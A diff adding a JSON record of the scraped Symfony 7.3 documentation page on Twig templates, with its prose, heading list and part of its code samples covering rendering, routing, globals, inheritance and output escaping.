@@ -1,0 +1,507 @@
+{
+  "url": "https://symfony.com/doc/7.3/templates.html",
+  "title": "Creating and Using Templates",
+  "content": "A template is the best way to organize and render HTML from inside your application, whether you need to render HTML from a controller or generate the contents of an email. Templates in Symfony are created with Twig: a flexible, fast, and secure template engine.\n\nIn applications using Symfony Flex, run the following command to install both Twig language support and its integration with Symfony applications:\n\nThe Twig templating language allows you to write concise, readable templates that are more friendly to web designers and, in several ways, more powerful than PHP templates. Take a look at the following Twig template example. Even if it's the first time you see Twig, you probably understand most of it:\n\nTwig syntax is based on these three constructs:\n\nYou can't run PHP code inside Twig templates, but Twig provides utilities to run some logic in the templates. For example, filters modify content before being rendered, like the upper filter to uppercase contents:\n\nTwig comes with a long list of tags, filters and functions that are available by default. In Symfony applications you can also use these Twig filters and functions defined by Symfony and you can create your own Twig filters and functions.\n\nTwig is fast in the prod environment (because templates are compiled into PHP and cached automatically), but convenient to use in the dev environment (because templates are recompiled automatically when you change them).\n\nTwig has several configuration options to define things like the format used to display numbers and dates, the template caching, etc. Read the Twig configuration reference to learn about them.\n\nBefore explaining in detail how to create and render templates, look at the following example for a quick overview of the whole process. First, you need to create a new file in the templates/ directory to store the template contents:\n\nThen, create a controller that renders this template and passes to it the needed variables:\n\nSymfony recommends the following for template names:\n\nAlthough templates usually generate HTML contents, they can generate any text-based format. That's why the two-extension convention simplifies the way templates are created and rendered for multiple formats.\n\nTemplates are stored by default in the templates/ directory. When a service or controller renders the product/index.html.twig template, they are actually referring to the <your-project>/templates/product/index.html.twig file.\n\nThe default templates directory is configurable with the twig.default_path option and you can add more template directories as explained later in this article.\n\nA common need for templates is to print the values stored in the templates passed from the controller or service. Variables usually store objects and arrays instead of strings, numbers and boolean values. That's why Twig provides quick access to complex PHP variables. Consider the following template:\n\nThe user.name notation means that you want to display some information (name) stored in a variable (user). Is user an array or an object? Is name a property or a method? In Twig this doesn't matter.\n\nWhen using the foo.bar notation, Twig tries to get the value of the variable in the following order:\n\nThis allows to evolve your application code without having to change the template code (you can start with array variables for the application proof of concept, then move to objects with methods, etc.)\n\nInstead of writing the link URLs by hand, use the path() function to generate URLs based on the routing configuration.\n\nLater, if you want to modify the URL of a particular page, all you'll need to do is change the routing configuration: the templates will automatically generate the new URL.\n\nConsider the following routing configuration:\n\nUse the path() Twig function to link to these pages and pass the route name as the first argument and the route parameters as the optional second argument:\n\nThe path() function generates relative URLs. If you need to generate absolute URLs (for example when rendering templates for emails or RSS feeds), use the url() function, which takes the same arguments as path() (e.g. <a href=\"{{ url('blog_index') }}\"> ... </a>).\n\nIf a template needs to link to a static asset (e.g. an image), Symfony provides an asset() Twig function to help generate that URL. First, install the asset package:\n\nYou can now use the asset() function:\n\nUsing the asset() function is recommended for these reasons:\n\nIf you need absolute URLs for assets, use the absolute_url() Twig function as follows:\n\nFor help building and versioning your JavaScript and CSS assets in a modern way, read about Symfony's AssetMapper.\n\nSymfony creates a context object that is injected into every Twig template automatically as a variable called app. It provides access to some application information:\n\nThe app variable (which is an instance of AppVariable) gives you access to these variables:\n\nIn addition to the global app variable injected by Symfony, you can also inject variables automatically to all Twig templates as explained in the next section.\n\nTwig allows you to automatically inject one or more variables into all templates. These global variables are defined in the twig.globals option inside the main Twig configuration file:\n\nNow, the variable ga_tracking is available in all Twig templates, so you can use it without having to pass it explicitly from the controller or service that renders the template:\n\nIn addition to static values, Twig global variables can also reference services from the service container. The main drawback is that these services are not loaded lazily. In other words, as soon as Twig is loaded, your service is instantiated, even if you never use that global variable.\n\nTo define a service as a global Twig variable, prefix the service ID string with the @ character, which is the usual syntax to refer to services in container parameters:\n\nNow you can use the uuid variable in any Twig template to access to the UuidGenerator service:\n\nTwig components are an alternative way to render templates, where each template is bound to a \"component class\". This makes it easier to render and re-use small template \"units\" - like an alert, markup for a modal, or a category sidebar.\n\nFor more information, see UX Twig Component.\n\nTwig components also have one other superpower: they can become \"live\", where they automatically update (via Ajax) as the user interacts with them. For example, when your user types into a box, your Twig component will re-render via Ajax to show a list of results!\n\nTo learn more, see UX Live Component.\n\nIf your controller extends from the AbstractController, use the render() helper:\n\nIf your controller does not extend from AbstractController, you'll need to fetch services in your controller and use the render() method of the twig service.\n\nAnother option is to use the #[Template] attribute on the controller method to define the template to render:\n\nThe base AbstractController also provides the renderBlock() and renderBlockView() methods:\n\nThis might come handy when dealing with blocks in templates inheritance or when using Turbo Streams.\n\nSimilarly, you can use the #[Template] attribute on the controller to specify a block to render:\n\nThe #[Template] attribute's block argument was introduced in Symfony 7.2.\n\nInject the twig Symfony service into your own services and use its render() method. When using service autowiring you only need to add an argument in the service constructor and type-hint it with the Twig Environment:\n\nRead the docs about the mailer and Twig integration.\n\nAlthough templates are usually rendered in controllers and services, you can render static pages that don't need any variables directly from the route definition. Use the special TemplateController provided by Symfony:\n\nThe headers option was introduced in Symfony 7.2.\n\nTemplates are loaded in the application using a Twig template loader, which also provides a method to check for template existence. First, get the loader:\n\nThen, pass the path of the Twig template to the exists() method of the loader:\n\nSymfony provides several utilities to help you debug issues in your templates.\n\nThe lint:twig command checks that your Twig templates don't have any syntax errors. It's useful to run it before deploying your application to production (e.g. in your continuous integration server):\n\nThe option to exclude directories was introduced in Symfony 7.1.\n\nBefore Symfony 7.3, the --show-deprecations option only displayed the first deprecation found, so you had to run the command repeatedly.\n\nWhen running the linter inside GitHub Actions, the output is automatically adapted to the format required by GitHub, but you can force that format too:\n\nThe debug:twig command lists all the information available about Twig (functions, filters, global variables, etc.). It's useful to check if your custom Twig extensions are working properly and also to check the Twig features added when installing packages:\n\nSymfony provides a dump() function as an improved alternative to PHP's var_dump() function. This function is useful to inspect the contents of any variable and you can use it in Twig templates too.\n\nFirst, make sure that the VarDumper component is installed in the application:\n\nThen, use either the {% dump %} tag or the {{ dump() }} function depending on your needs:\n\nTo avoid leaking sensitive information, the dump() function/tag is only available in the dev and test configuration environments. If you try to use it in the prod environment, you will see a PHP error.\n\nIf certain Twig code is repeated in several templates, you can extract it into a single \"template fragment\" and include it in other templates. Imagine that the following code to display the user information is repeated in several places:\n\nFirst, create a new Twig template called blog/_user_profile.html.twig (the _ prefix is optional, but it's a convention used to better differentiate between full templates and template fragments).\n\nThen, remove that content from the original blog/index.html.twig template and add the following to include the template fragment:\n\nThe include() Twig function takes as argument the path of the template to include. The included template has access to all the variables of the template that includes it (use the with_context option to control this).\n\nYou can also pass variables to the included template. This is useful for example to rename variables. Imagine that your template stores the user information in a variable called blog_post.author instead of the user variable that the template fragment expects. Use the following to rename the variable:\n\nIncluding template fragments is useful to reuse the same content on several pages. However, this technique is not the best solution in some cases.\n\nImagine that the template fragment displays the three most recent blog articles. To do that, it needs to make a database query to get those articles. When using the include() function, you'd need to do the same database query in every page that includes the fragment. This is not very convenient.\n\nA better alternative is to embed the result of executing some controller with the render() and controller() Twig functions.\n\nFirst, create the controller that renders a certain number of recent articles:\n\nThen, create the blog/_recent_articles.html.twig template fragment (the _ prefix in the template name is optional, but it's a convention used to better differentiate between full templates and template fragments):\n\nNow you can call to this controller from any template to embed its result:\n\nWhen using the controller() function, controllers are not accessed using a regular Symfony route but through a special URL used exclusively to serve those template fragments. Configure that special URL in the fragments option:\n\nEmbedding controllers requires making requests to those controllers and rendering some templates as result. This can have a significant impact on the application performance if you embed lots of controllers. If possible, cache the template fragment.\n\nTemplates can also embed contents asynchronously with the hinclude.js JavaScript library.\n\nFirst, include the hinclude.js library in your page linking to it from the template or adding it to your application JavaScript using AssetMapper.\n\nAs the embedded content comes from another page (or controller for that matter), Symfony uses a version of the standard render() function to configure hinclude tags in templates:\n\nWhen using the controller() function, you must also configure the fragments path option.\n\nWhen JavaScript is disabled or it takes a long time to load you can display a default content rendering some template:\n\nYou can define default templates per render() function (which will override any global default template that is defined):\n\nOr you can also specify a string to display as the default content:\n\nUse the attributes option to define the value of hinclude.js options:\n\nAs your application grows you'll find more and more repeated elements between pages, such as headers, footers, sidebars, etc. Including templates and embedding controllers can help, but when pages share a common structure, it's better to use inheritance.\n\nThe concept of Twig template inheritance is similar to PHP class inheritance. You define a parent template that other templates can extend from and child templates can override parts of the parent template.\n\nSymfony recommends the following three-level template inheritance for medium and complex applications:\n\nIn practice, the base.html.twig template would look like this:\n\nThe Twig block tag defines the page sections that can be overridden in the child templates. They can be empty, like the content block or define a default content, like the title block, which is displayed when child templates don't override them.\n\nThe blog/layout.html.twig template could be like this:\n\nThe template extends from base.html.twig and only defines the contents of the content block. The rest of the parent template blocks will display their default contents. However, they can be overridden by the third-level inheritance template, such as blog/index.html.twig, which displays the blog index:\n\nThis template extends from the second-level template (blog/layout.html.twig) but overrides blocks of different parent templates: page_contents from blog/layout.html.twig and title from base.html.twig.\n\nWhen you render the blog/index.html.twig template, Symfony uses three different templates to create the final contents. This inheritance mechanism boosts your productivity because each template includes only its unique contents and leaves the repeated contents and HTML structure to some parent templates.\n\nWhen using extends, a child template is forbidden to define template parts outside of a block. The following code throws a SyntaxError:\n\nRead the Twig template inheritance docs to learn more about how to reuse parent block contents when overriding templates and other advanced features.\n\nImagine that your template includes the Hello {{ name }} code to display the user name and a malicious user sets the following as their name:\n\nYou'll see My Name on screen but the attacker just secretly stole your cookies so they can impersonate you on other websites. This is known as a Cross-Site Scripting or XSS attack.\n\nTo prevent this attack, use \"output escaping\" to transform the characters which have special meaning (e.g. replace < by the &lt; HTML entity). Symfony applications are safe by default because they perform automatic output escaping:\n\nIf you are rendering a variable that is trusted and contains HTML contents, use the Twig raw filter to disable the output escaping for that variable:\n\nRead the Twig output escaping docs to learn more about how to disable output escaping for a block or even an entire template.\n\nAlthough most applications store their templates in the default templates/ directory, you may need to store some or all of them in different directories. Use the twig.paths option to configure those extra directories. Each path is defined as a key: value pair where the key is the template directory and the value is the Twig namespace, which is explained later:\n\nWhen rendering a template, Symfony looks for it first in the twig.paths directories that don't define a namespace and then falls back to the default template directory (usually, templates/).\n\nUsing the above configuration, if your application renders for example the layout.html.twig template, Symfony will first look for email/default/templates/layout.html.twig and backend/templates/layout.html.twig. If any of those templates exists, Symfony will use it instead of using templates/layout.html.twig, which is probably the template you wanted to use.\n\nTwig solves this problem with namespaces, which group several templates under a logic name unrelated to their actual location. Update the previous configuration to define a namespace for each template directory:\n\nNow, if you render the layout.html.twig template, Symfony will render the templates/layout.html.twig file. Use the special syntax @ + namespace to refer to the other namespaced templates (e.g. @email/layout.html.twig and @admin/layout.html.twig).\n\nA single Twig namespace can be associated with more than one template directory. In that case, the order in which paths are added is important because Twig will start looking for templates from the first defined path.\n\nIf you install packages/bundles in your application, they may include their own Twig templates (in the templates/ directory of each bundle). To avoid messing with your own templates, Symfony adds bundle templates under an automatic namespace created after the bundle name.\n\nFor example, the templates of a bundle called AcmeBlogBundle are available under the AcmeBlog namespace. If this bundle includes the template <your-project>/vendor/acme/blog-bundle/templates/user/profile.html.twig, you can refer to it as @AcmeBlog/user/profile.html.twig.\n\nYou can also override bundle templates in case you want to change some parts of the original bundle templates.\n\nTwig Extensions allow the creation of custom functions, filters, and more to use in your Twig templates. Before writing your own Twig extension, check if the filter/function that you need is not already implemented in:\n\nSuppose you want to create a new filter called price that formats a number as currency:\n\nCreate a regular PHP class with a method that contains the filter logic. Then, add the #[AsTwigFilter] attribute to define the name and options of the Twig filter:\n\nIf you want to create a function instead of a filter, use the #[AsTwigFunction] attribute:\n\nAlong with custom filters and functions, you can also register global variables.\n\nSupport for the #[AsTwigFilter], #[AsTwigFunction] and #[AsTwigTest] attributes was introduced in Symfony 7.3. Previously, you had to extend the AbstractExtension class, and override the getFilters() and getFunctions() methods.\n\nIf you're using the default services.yaml configuration, the service autoconfiguration feature will enable this class as a Twig extension. Otherwise, you need to define a service manually and tag it with the twig.attribute_extension tag.\n\nNext, register your class as a service and tag it with twig.extension. If you're using the default services.yaml configuration, you're done! Symfony will automatically know about your new service and add the tag.\n\nYou can now start using your filter in any Twig template. Optionally, execute this command to confirm that your new filter was successfully registered:\n\nWhen using attributes to extend Twig, the Twig extensions are already lazy-loaded and you don't have to do anything else. However, if your Twig extensions follow the legacy approach of extending the AbstractExtension class, Twig initializes all the extensions before rendering any template, even if they are not used.\n\nIf extensions don't define dependencies (i.e. if you don't inject services in them) performance is not affected. However, if extensions define lots of complex dependencies (e.g. those making database connections), the performance loss can be significant.\n\nThat's why Twig allows decoupling the extension definition from its implementation. Following the same example as before, the first change would be to remove the formatPrice() method from the extension and update the PHP callable defined in getFilters():\n\nThen, create the new AppRuntime class (it's not required but these classes are suffixed with Runtime by convention) and include the logic of the previous formatPrice() method:\n\nIf you're using the default services.yaml configuration, this will already work! Otherwise, create a service for this class and tag your service with twig.runtime.\n\nOnline exam, become Sylius certified today\n\nPeruse our complete Symfony & PHP solutions catalog for your web development needs.",
+  "headings": [
+    {
+      "level": "h1",
+      "text": "Creating and Using Templates",
+      "id": "creating-and-using-templates"
+    },
+    {
+      "level": "h2",
+      "text": "Installation",
+      "id": "installation"
+    },
+    {
+      "level": "h2",
+      "text": "Twig Templating Language",
+      "id": "twig-templating-language"
+    },
+    {
+      "level": "h3",
+      "text": "Twig Configuration",
+      "id": "twig-configuration"
+    },
+    {
+      "level": "h2",
+      "text": "Creating Templates",
+      "id": "creating-templates"
+    },
+    {
+      "level": "h3",
+      "text": "Template Naming",
+      "id": "template-naming"
+    },
+    {
+      "level": "h3",
+      "text": "Template Location",
+      "id": "template-location"
+    },
+    {
+      "level": "h3",
+      "text": "Template Variables",
+      "id": "template-variables"
+    },
+    {
+      "level": "h3",
+      "text": "Linking to Pages",
+      "id": "linking-to-pages"
+    },
+    {
+      "level": "h3",
+      "text": "Linking to CSS, JavaScript and Image Assets",
+      "id": "linking-to-css-javascript-and-image-assets"
+    },
+    {
+      "level": "h3",
+      "text": "Build, Versioning & More Advanced CSS, JavaScript and Image Handling",
+      "id": "build-versioning-more-advanced-css-javascript-and-image-handling"
+    },
+    {
+      "level": "h3",
+      "text": "The App Global Variable",
+      "id": "the-app-global-variable"
+    },
+    {
+      "level": "h3",
+      "text": "Global Variables",
+      "id": "global-variables"
+    },
+    {
+      "level": "h2",
+      "text": "Twig Components",
+      "id": "twig-components"
+    },
+    {
+      "level": "h2",
+      "text": "Rendering Templates",
+      "id": "rendering-templates"
+    },
+    {
+      "level": "h3",
+      "text": "Rendering a Template in Controllers",
+      "id": "rendering-a-template-in-controllers"
+    },
+    {
+      "level": "h3",
+      "text": "Rendering a Template in Services",
+      "id": "rendering-a-template-in-services"
+    },
+    {
+      "level": "h3",
+      "text": "Rendering a Template in Emails",
+      "id": "rendering-a-template-in-emails"
+    },
+    {
+      "level": "h3",
+      "text": "Rendering a Template Directly from a Route",
+      "id": "rendering-a-template-directly-from-a-route"
+    },
+    {
+      "level": "h3",
+      "text": "Checking if a Template Exists",
+      "id": "checking-if-a-template-exists"
+    },
+    {
+      "level": "h2",
+      "text": "Debugging Templates",
+      "id": "debugging-templates"
+    },
+    {
+      "level": "h3",
+      "text": "Linting Twig Templates",
+      "id": "linting-twig-templates"
+    },
+    {
+      "level": "h3",
+      "text": "Inspecting Twig Information",
+      "id": "inspecting-twig-information"
+    },
+    {
+      "level": "h3",
+      "text": "The Dump Twig Utilities",
+      "id": "the-dump-twig-utilities"
+    },
+    {
+      "level": "h2",
+      "text": "Reusing Template Contents",
+      "id": "reusing-template-contents"
+    },
+    {
+      "level": "h3",
+      "text": "Including Templates",
+      "id": "including-templates"
+    },
+    {
+      "level": "h3",
+      "text": "Embedding Controllers",
+      "id": "embedding-controllers"
+    },
+    {
+      "level": "h2",
+      "text": "How to Embed Asynchronous Content with hinclude.js",
+      "id": "how-to-embed-asynchronous-content-with-hinclude-js"
+    },
+    {
+      "level": "h3",
+      "text": "Template Inheritance and Layouts",
+      "id": "template-inheritance-and-layouts"
+    },
+    {
+      "level": "h2",
+      "text": "Output Escaping and XSS Attacks",
+      "id": "output-escaping-and-xss-attacks"
+    },
+    {
+      "level": "h2",
+      "text": "Template Namespaces",
+      "id": "template-namespaces"
+    },
+    {
+      "level": "h3",
+      "text": "Bundle Templates",
+      "id": "bundle-templates"
+    },
+    {
+      "level": "h2",
+      "text": "Writing a Twig Extension",
+      "id": "writing-a-twig-extension"
+    },
+    {
+      "level": "h3",
+      "text": "Create the Extension Class",
+      "id": "create-the-extension-class"
+    },
+    {
+      "level": "h4",
+      "text": "Register an Extension as a Service",
+      "id": "register-an-extension-as-a-service"
+    },
+    {
+      "level": "h3",
+      "text": "Creating Lazy-Loaded Twig Extensions",
+      "id": "creating-lazy-loaded-twig-extensions"
+    }
+  ],
+  "code_samples": [
+    {
+      "code": "$ composer require symfony/twig-bundle",
+      "language": "unknown"
+    },
+    {
+      "code": "<!DOCTYPE html>\n<html>\n    <head>\n        <title>Welcome to Symfony!</title>\n    </head>\n    <body>\n        <h1>{{ page_title }}</h1>\n\n        {% if user.isLoggedIn %}\n            Hello {{ user.name }}!\n        {% endif %}\n\n        {# ... #}\n    </body>\n</html>",
+      "language": "unknown"
+    },
+    {
+      "code": "{{ title|upper }}",
+      "language": "unknown"
+    },
+    {
+      "code": "{# templates/user/notifications.html.twig #}\n<h1>Hello {{ user_first_name }}!</h1>\n<p>You have {{ notifications|length }} new notifications.</p>",
+      "language": "unknown"
+    },
+    {
+      "code": "// src/Controller/UserController.php\nnamespace App\\Controller;\n\nuse Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\nuse Symfony\\Component\\HttpFoundation\\Response;\n\nclass UserController extends AbstractController\n{\n    // ...\n\n    public function notifications(): Response\n    {\n        // get the user information and notifications somehow\n        $userFirstName = '...';\n        $userNotifications = ['...', '...'];\n\n        // the template path is the relative file path from `templates/`\n        return $this->render('user/notifications.html.twig', [\n            // this array defines the variables passed to the template,\n            // where the key is the variable name and the value is the variable value\n            // (Twig recommends using snake_case variable names: 'foo_bar' instead of 'fooBar')\n            'user_first_name' => $userFirstName,\n            'notifications' => $userNotifications,\n        ]);\n    }\n}",
+      "language": "javascript"
+    },
+    {
+      "code": "<p>{{ user.name }} added this comment on {{ comment.publishedAt|date }}</p>",
+      "language": "unknown"
+    },
+    {
+      "code": "// src/Controller/BlogController.php\nnamespace App\\Controller;\n\n// ...\nuse Symfony\\Component\\HttpFoundation\\Response;\nuse Symfony\\Component\\Routing\\Attribute\\Route;\n\nclass BlogController extends AbstractController\n{\n    #[Route('/', name: 'blog_index')]\n    public function index(): Response\n    {\n        // ...\n    }\n\n    #[Route('/article/{slug}', name: 'blog_post')]\n    public function show(string $slug): Response\n    {\n        // ...\n    }\n}",
+      "language": "csharp"
+    },
+    {
+      "code": "# config/routes.yaml\nblog_index:\n    path:       /\n    controller: App\\Controller\\BlogController::index\n\nblog_post:\n    path:       /article/{slug}\n    controller: App\\Controller\\BlogController::show",
+      "language": "unknown"
+    },
+    {
+      "code": "<!-- config/routes.xml -->\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<routes xmlns=\"http://symfony.com/schema/routing\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xsi:schemaLocation=\"http://symfony.com/schema/routing\n        https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n    <route id=\"blog_index\"\n        path=\"/\"\n        controller=\"App\\Controller\\BlogController::index\"/>\n\n    <route id=\"blog_post\"\n        path=\"/article/{slug}\"\n        controller=\"App\\Controller\\BlogController::show\"/>\n</routes>",
+      "language": "unknown"
+    },
+    {
+      "code": "// config/routes.php\nuse App\\Controller\\BlogController;\nuse Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\nreturn function (RoutingConfigurator $routes): void {\n    $routes->add('blog_index', '/')\n        ->controller([BlogController::class, 'index'])\n    ;\n\n    $routes->add('blog_post', '/articles/{slug}')\n        ->controller([BlogController::class, 'show'])\n    ;\n};",
+      "language": "unknown"
+    },
+    {
+      "code": "<a href=\"{{ path('blog_index') }}\">Homepage</a>\n\n{# ... #}\n\n{% for post in blog_posts %}\n    <h1>\n        <a href=\"{{ path('blog_post', {slug: post.slug}) }}\">{{ post.title }}</a>\n    </h1>\n\n    <p>{{ post.excerpt }}</p>\n{% endfor %}",
+      "language": "unknown"
+    },
+    {
+      "code": "$ composer require symfony/asset",
+      "language": "unknown"
+    },
+    {
+      "code": "{# the image lives at \"public/images/logo.png\" #}\n<img src=\"{{ asset('images/logo.png') }}\" alt=\"Symfony!\">\n\n{# the CSS file lives at \"public/css/blog.css\" #}\n<link href=\"{{ asset('css/blog.css') }}\" rel=\"stylesheet\">\n\n{# the JS file lives at \"public/bundles/acme/js/loader.js\" #}\n<script src=\"{{ asset('bundles/acme/js/loader.js') }}\"></script>",
+      "language": "unknown"
+    },
+    {
+      "code": "<img src=\"{{ absolute_url(asset('images/logo.png')) }}\" alt=\"Symfony!\">\n\n<link rel=\"shortcut icon\" href=\"{{ absolute_url('favicon.png') }}\">",
+      "language": "unknown"
+    },
+    {
+      "code": "<p>Username: {{ app.user.username ?? 'Anonymous user' }}</p>\n{% if app.debug %}\n    <p>Request method: {{ app.request.method }}</p>\n    <p>Application Environment: {{ app.environment }}</p>\n{% endif %}",
+      "language": "unknown"
+    },
+    {
+      "code": "# config/packages/twig.yaml\ntwig:\n    # ...\n    globals:\n        ga_tracking: 'UA-xxxxx-x'",
+      "language": "unknown"
+    },
+    {
+      "code": "<!-- config/packages/twig.xml -->\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<container xmlns=\"http://symfony.com/schema/dic/services\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xmlns:twig=\"http://symfony.com/schema/dic/twig\"\n    xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n        https://symfony.com/schema/dic/services/services-1.0.xsd\n        http://symfony.com/schema/dic/twig\n        https://symfony.com/schema/dic/twig/twig-1.0.xsd\">\n\n    <twig:config>\n        <!-- ... -->\n        <twig:global key=\"ga_tracking\">UA-xxxxx-x</twig:global>\n    </twig:config>\n</container>",
+      "language": "unknown"
+    },
+    {
+      "code": "// config/packages/twig.php\nuse Symfony\\Config\\TwigConfig;\n\nreturn static function (TwigConfig $twig): void {\n    // ...\n\n    $twig->global('ga_tracking')->value('UA-xxxxx-x');\n};",
+      "language": "unknown"
+    },
+    {
+      "code": "<p>The Google tracking code is: {{ ga_tracking }}</p>",
+      "language": "unknown"
+    },
+    {
+      "code": "# config/packages/twig.yaml\ntwig:\n    # ...\n    globals:\n        # the value is the service's id\n        uuid: '@App\\Generator\\UuidGenerator'",
+      "language": "unknown"
+    },
+    {
+      "code": "<!-- config/packages/twig.xml -->\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<container xmlns=\"http://symfony.com/schema/dic/services\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xmlns:twig=\"http://symfony.com/schema/dic/twig\"\n    xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n        https://symfony.com/schema/dic/services/services-1.0.xsd\n        http://symfony.com/schema/dic/twig\n        https://symfony.com/schema/dic/twig/twig-1.0.xsd\">\n\n    <twig:config>\n        <!-- ... -->\n        <twig:global key=\"uuid\" id=\"App\\Generator\\UuidGenerator\" type=\"service\"/>\n    </twig:config>\n</container>",
+      "language": "unknown"
+    },
+    {
+      "code": "// config/packages/twig.php\nuse Symfony\\Config\\TwigConfig;\nuse function Symfony\\Component\\DependencyInjection\\Loader\\Configurator\\service;\n\nreturn static function (TwigConfig $twig): void {\n    // ...\n\n    $twig->global('uuid')->value(service('App\\Generator\\UuidGenerator'));\n};",
+      "language": "unknown"
+    },
+    {
+      "code": "UUID: {{ uuid.generate }}",
+      "language": "unknown"
+    },
+    {
+      "code": "// src/Controller/ProductController.php\nnamespace App\\Controller;\n\nuse Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\nuse Symfony\\Component\\HttpFoundation\\Response;\n\nclass ProductController extends AbstractController\n{\n    public function index(): Response\n    {\n        // ...\n\n        // the `render()` method returns a `Response` object with the\n        // contents created by the template\n        return $this->render('product/index.html.twig', [\n            'category' => '...',\n            'promotions' => ['...', '...'],\n        ]);\n\n        // the `renderView()` method only returns the contents created by the\n        // template, so you can use those contents later in a `Response` object\n        $contents = $this->renderView('product/index.html.twig', [\n            'category' => '...',\n            'promotions' => ['...', '...'],\n        ]);\n\n        return new Response($contents);\n    }\n}",
+      "language": "javascript"
+    },
+    {
+      "code": "// src/Controller/ProductController.php\nnamespace App\\Controller;\n\nuse Symfony\\Bridge\\Twig\\Attribute\\Template;\nuse Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\nuse Symfony\\Component\\HttpFoundation\\Response;\n\nclass ProductController extends AbstractController\n{\n    #[Template('product/index.html.twig')]\n    public function index(): array\n    {\n        // ...\n\n        // when using the #[Template] attribute, you only need to return\n        // an array with the parameters to pass to the template (the attribute\n        // is the one which will create and return the Response object).\n        return [\n            'category' => '...',\n            'promotions' => ['...', '...'],\n        ];\n    }\n}",
+      "language": "javascript"
+    },
+    {
+      "code": "// src/Controller/ProductController.php\nnamespace App\\Controller;\n\nuse Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\nuse Symfony\\Component\\HttpFoundation\\Response;\n\nclass ProductController extends AbstractController\n{\n    // ...\n\n    public function price(): Response\n    {\n        // ...\n\n        // the `renderBlock()` method returns a `Response` object with the\n        // block contents\n        return $this->renderBlock('product/index.html.twig', 'price_block', [\n            // ...\n        ]);\n\n        // the `renderBlockView()` method only returns the contents created by the\n        // template block, so you can use those contents later in a `Response` object\n        $contents = $this->renderBlockView('product/index.html.twig', 'price_block', [\n            // ...\n        ]);\n\n        return new Response($contents);\n    }\n}",
+      "language": "csharp"
+    },
+    {
+      "code": "// src/Controller/ProductController.php\nnamespace App\\Controller;\n\nuse Symfony\\Bridge\\Twig\\Attribute\\Template;\nuse Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\nuse Symfony\\Component\\HttpFoundation\\Response;\n\nclass ProductController extends AbstractController\n{\n    #[Template('product.html.twig', block: 'price_block')]\n    public function price(): array\n    {\n        return [\n            // ...\n        ];\n    }\n}",
+      "language": "csharp"
+    },
+    {
+      "code": "// src/Service/SomeService.php\nnamespace App\\Service;\n\nuse Twig\\Environment;\n\nclass SomeService\n{\n    public function __construct(\n        private Environment $twig,\n    ) {\n    }\n\n    public function someMethod(): void\n    {\n        // ...\n\n        $htmlContents = $this->twig->render('product/index.html.twig', [\n            'category' => '...',\n            'promotions' => ['...', '...'],\n        ]);\n    }\n}",
+      "language": "javascript"
+    },
+    {
+      "code": "# config/routes.yaml\nacme_privacy:\n    path:          /privacy\n    controller:    Symfony\\Bundle\\FrameworkBundle\\Controller\\TemplateController\n    defaults:\n        # the path of the template to render\n        template:  'static/privacy.html.twig'\n\n        # the response status code (default: 200)\n        statusCode: 200\n\n        # special options defined by Symfony to set the page cache\n        maxAge:    86400\n        sharedAge: 86400\n\n        # whether or not caching should apply for client caches only\n        private: true\n\n        # optionally you can define some arguments passed to the template\n        context:\n            site_name: 'ACME'\n            theme: 'dark'\n\n        # optionally you can define HTTP headers to add to the response\n        headers:\n            Content-Type: 'text/html'\n            foo: 'bar'",
+      "language": "unknown"
+    },
+    {
+      "code": "<!-- config/routes.xml -->\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<routes xmlns=\"http://symfony.com/schema/routing\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xsi:schemaLocation=\"http://symfony.com/schema/routing https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n    <route id=\"acme_privacy\"\n        path=\"/privacy\"\n        controller=\"Symfony\\Bundle\\FrameworkBundle\\Controller\\TemplateController\">\n        <!-- the path of the template to render -->\n        <default key=\"template\">static/privacy.html.twig</default>\n\n        <!-- the response status code (default: 200) -->\n        <default key=\"statusCode\">200</default>\n\n        <!-- special options defined by Symfony to set the page cache -->\n        <default key=\"maxAge\">86400</default>\n        <default key=\"sharedAge\">86400</default>\n\n        <!-- whether or not caching should apply for client caches only -->\n        <default key=\"private\">true</default>\n\n        <!-- optionally you can define some arguments passed to the template -->\n        <default key=\"context\">\n            <default key=\"site_name\">ACME</default>\n            <default key=\"theme\">dark</default>\n        </default>\n\n        <!-- optionally you can define HTTP headers to add to the response -->\n        <default key=\"headers\">\n            <default key=\"Content-Type\">text/html</default>\n        </default>\n    </route>\n</routes>",
+      "language": "unknown"
+    },
+    {
+      "code": "// config/routes.php\nuse Symfony\\Bundle\\FrameworkBundle\\Controller\\TemplateController;\nuse Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\nreturn function (RoutingConfigurator $routes): void {\n    $routes->add('acme_privacy', '/privacy')\n        ->controller(TemplateController::class)\n        ->defaults([\n            // the path of the template to render\n            'template'  => 'static/privacy.html.twig',\n\n            // the response status code (default: 200)\n            'statusCode' => 200,\n\n            // special options defined by Symfony to set the page cache\n            'maxAge'    => 86400,\n            'sharedAge' => 86400,\n\n            // whether or not caching should apply for client caches only\n            'private' => true,\n\n            // optionally you can define some arguments passed to the template\n            'context' => [\n                'site_name' => 'ACME',\n                'theme' => 'dark',\n                ],\n\n            // optionally you can define HTTP headers to add to the response\n            'headers' => [\n                'Content-Type' => 'text/html',\n            ]\n        ])\n    ;\n};",
+      "language": "javascript"
+    },
+    {
+      "code": "use Twig\\Environment;\n\nclass YourService\n{\n    // this code assumes that your service uses autowiring to inject dependencies\n    // otherwise, inject the service called 'twig' manually\n    public function __construct(Environment $twig)\n    {\n        $loader = $twig->getLoader();\n    }\n}",
+      "language": "unknown"
+    },
+    {
+      "code": "if ($loader->exists('theme/layout_responsive.html.twig')) {\n    // the template exists, do something\n    // ...\n}",
+      "language": "unknown"
+    },
+    {
